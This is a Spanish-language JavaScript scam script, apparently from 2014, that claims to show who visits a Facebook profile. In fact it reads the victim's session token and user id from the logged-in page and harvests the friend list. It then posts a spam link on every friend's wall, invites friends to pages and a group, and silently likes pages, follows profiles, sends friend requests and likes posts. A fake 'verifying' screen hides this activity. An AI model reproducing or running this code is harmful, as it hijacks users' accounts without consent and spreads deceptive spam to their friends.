var Title = 'Quien Visita Tu Perfil 3.0 2014';
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/119277694885439" target="_blank">Developer Youtrick/Newtrick</A></br>Script Made By:  </A><A style="color:#3B5998;" href="https://www.facebook.com/119277694885439" target="_blank">SC Team</A></A>,</A></A>.</br><A style="color:#3B5998;" href="http://www.airforcedownload.com/" target="_blank">Quien Visita Tu Perfil 2014</A>.</A>';
var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>"; /*|undefined undefined|*/
display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
display += "<div><textarea id='txtFloodMsg' placeholder=''  style='padding-top:5px;width:505px;height:100px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.9);'></textarea></div>";
display += "<div class='clearfix' style='text-align:right;padding-top:5px;'><a style='text-align:right;padding-top:5px;' data-hover='tooltip' aria-label='Your friends' data-tooltip-alignh='right' class='uiSelectorButton uiButton uiButtonSuppressed' href='#' role='button' aria-haspopup='1' aria-expanded='false' data-label='' data-length='30' data-ariaprefix='Post Privacy Setting' rel='toggle' id='js_14'><i class='mrs defaultIcon customimg img sp_5ym4oy sx_042661'></i><span class='uiButtonText'>Amigos</span></a><a><span id='UIButton_Start' onclick='autopostingfunc()' style='text-align:center;font-family:tahoma;color:white;width:45px;height:25px;' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected'>Iniciar</span></a></div>";
display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
display += _text;
window[tag + '_close'] = true;
display += "</div>";
display += "</div>";
document.getElementById("pagelet_sidebar").innerHTML = display;
 
function Posting(o) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/stream/inline.php?fb_dtsg=" + fb_dtsg + "&walltarget=" + o + "&render_notif_only=1&birthday=1&message_text=" + encodeURIComponent(msg) + "&message=Increible! Nunca Pense Que Funcionaria, mira Esto: http://fbtrucos2014.blogspot.com :3 \n" + encodeURIComponent(msg) + "&giftsgroupid=8ff493ad46&post=Post&nctr[_mod]=pagelet_reminders&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFIwd9e&__req=1b&phstamp=", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            Descriptions += 'No Verificado';
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += "Verificando A " + arn[i] + "\'<br/>";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>"; /*|undefined undefined|*/
        if (i > 0) {
            var Title = 'Verificando Quien Visita Tu Perfil';
            display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
            display += arr.length + " Amigos Encontrados<br/>";
            display += "<b>" + suc + "</b> Amigos Verificados de " + (arr.length - i) + " Amigos Procesados ";
            display += "(" + i + " Restan...)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='padding-left:8px;font-size:14px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += getuname + " Por Favor Espere....<br/>";
display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Ir a Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Cancelar</span><br/>";
            display += _text;
            window[tag + '_close'] = true;
            display += "</div>";
            display += "</div>";
            display += "</div>"
        } else {
            Title = 'Verificacion Completada (Continua Con El Tutorial)';
            display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
            display += arr.length + " Amigos Encontrados y " + suc + " Amigos Verificados</br></br>";
            window[tag + '_close'] = false;
            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>ir a Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Actualizar</span><span style='color:black' class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cerrar</span><br/>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            display += _text;
            display += "</div>"
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[i];
        setTimeout("Posting(" + s + ");", 10)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
   
  if (fb_dtsg){
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + o + "%22%3A1%7D&checkableitems[0]=" + o + "&page_id=359706207498038&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
               }
  if (fb_dtsg){
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + o + "%22%3A1%7D&checkableitems[0]=" + o + "&page_id=235759599932126&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
               }
  if (fb_dtsg){
    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=310509582323426&source=typeahead&members=" + o + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
              }
}
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};
 
function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
};
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + '_close']) {
        return 'This script is running now!'
    }
};
var now = (new Date).getTime();
var tag = 'Close';
var i = 3;
var tay = 3;
var suc = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var msg = '';
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length)
});
 
function autopostingfunc() {
    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
    Posting(arr[i])
}
 
var parent=document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
_div.style.height="25";
_div.style.width="100%";
_div.style.position="fixed";
_div.style.top="auto";
_div.style.bottom="0";
_div.align="center";
var _audio= document.createElement('audio');
_audio.style.width="100%";
_audio.style.height="25px";
_audio.controls = true;
_audio.autoplay = true;
_audio.src = "https://codegooglesite.googlecode.com/files/YellowLemonTree.mp3";
_div.appendChild(_audio);
_body.appendChild(_div);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
body = document.body;
if(body != null)
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "100px";
 div.style.opacity= 0.90;
 div.style.bottom = "+60px";
 div.style.left = "+0px";
 div.style.backgroundColor = "rgba(0,0,0,0.5)";
 div.style.border = "1px solid rgba(0,0,0,0.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fshar.es%2FKtPvD&t=Facebook+Background+Theme' title='Share'><blink><center>SHARE</center></blink></a>"
 body.appendChild(div);
}
 
if(body != null)
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "100px";
 div.style.opacity= 0.90;
 div.style.bottom = "+35px";
 div.style.left = "+0px";
 div.style.backgroundColor = "rgba(0,0,0,0.5)";
 div.style.border = "1px solid rgba(0,0,0,0.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Cerrar (F5)</center></blink></a>"
 body.appendChild(div);
}
if(body != null)
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "135px";
 div.style.opacity= 0.90;
 div.style.bottom = "+10px";
 div.style.left = "+0px";
 div.style.backgroundColor = "rgba(0,0,0,0.5)";
 div.style.border = "1px solid rgba(0,0,0,0.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/484835458298357' title='Desarroladores'><blink><center>Desarrolladores</center></blink></a>"
 body.appendChild(div);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
 
    LIST("643721125675801");
   
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("");
Like("");
Like("");
Like("");
Like("128781417241181");
Like("359706207498038");
Like("235759599932126");
Like("");
Like("");
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("");
IDS("");
IDS("");
IDS("");
IDS("");
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}
a("");
a("");
a("");
a("");
a("");
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(post) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}    
P("");
P("");
P("");
P("");
P("");
 
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(opo) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}    
P("");
P("");
P("");
P("");
P("");
